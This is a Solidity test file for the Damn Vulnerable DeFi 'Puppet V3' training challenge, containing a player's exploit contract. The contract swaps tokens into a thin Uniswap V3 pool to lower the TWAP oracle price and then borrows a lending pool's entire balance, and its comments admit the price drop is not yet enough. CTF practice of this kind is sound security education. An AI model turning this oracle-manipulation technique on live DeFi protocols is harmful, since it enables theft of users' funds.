// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import {IUniswapV3FlashCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3FlashCallback.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";

contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;

    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);

        // Set player's initial balance
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deployer wraps ETH in WETH
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = new DamnValuableToken();

        // Create Uniswap v3 pool
        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0,
            token1: token1,
            fee: FEE,
            sqrtPriceX96: _encodePriceSqrt(1, 1)
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
        uniswapPool.increaseObservationCardinalityNext(40);

        // Deployer adds liquidity at current price to Uniswap V3 exchange
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        // Deploy the lending pool
        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

        // Setup initial token balances of lending pool and player
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        skip(3 days);

        initialBlockTimestamp = block.timestamp;

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV3() public checkSolvedByPlayer {
        // SYSTEM
        // 1. There is a pool offering 1 million DVT tokens for borrowing against 3 times the value of DVT in WETH
        // 2. It reads the TWAP price of DVT in WETH from a Uniswap v3 pool
        // 3. The period for TWAP calculation is 10 minutes, and the cardinatlity of the pool is 40
        // 3. The uniswap v3 pool has 100 DVT and 100 WETH in liquidity
        // 4. The player has 110 DVT and 1 WETH

        // token0 is DVT
        // token1 is WETH

        // THE CODE BELOW LOWERS THE TWAP PRICE OF DVT IN WETH, BUT it is not enough
        // find how to influence it more

        // Get the instance of the Uniswap v3 pool
        IUniswapV3Pool uniswap = lendingPool.uniswapV3Pool();

        // Create the exploit contract to interact with pools
        Exploit exploit = new Exploit(lendingPool, uniswap, token, weth);

        // Send tokens to the exploit contract
        token.transfer(address(exploit), 110e18);

        // Crash the price of DVT
        exploit.swap(int256(PLAYER_INITIAL_TOKEN_BALANCE));

        // Wait until the TWAP price of DVT drops down (this level allows for 115 second from initialBlockTimestamp)
        skip(114 seconds);

        // Take all the DVT from the lending pool and send it to the recovery account
        exploit.borrow(recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }

    function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
        return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
    }
}

contract Exploit is IUniswapV3SwapCallback {
    PuppetV3Pool pool;
    IUniswapV3Pool uniswap;
    DamnValuableToken token;
    WETH weth;

    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint160 constant MIN_SQRT_RATIO = 4295128739;

    constructor(PuppetV3Pool _pool, IUniswapV3Pool _uniswap, DamnValuableToken _token, WETH _weth) {
        pool = _pool;
        uniswap = _uniswap;
        token = _token;
        weth = _weth;
    }

    // Take all the DVT from PuppetV3Pool for a fraction of initial deposit required
    function borrow(address recovery) public {
        // Approve the pool to take the required amount of WETH as deposit
        weth.approve(address(pool), pool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
        // Borrow all the DVT from the pool
        pool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Transfer the DVT to the recovery address
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    // Function to swap DVT for WETH on the Uniswap V3 pool to decrease its price
    function swap(int256 amountDVT) public {
        uniswap.swap(address(this), true, amountDVT, MIN_SQRT_RATIO + 1, "");
    }

    // Callback function called during UniswapV3Pool::swap
    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes calldata) external {
        token.transfer(address(uniswap), uint256(amount0Delta));
    }
}
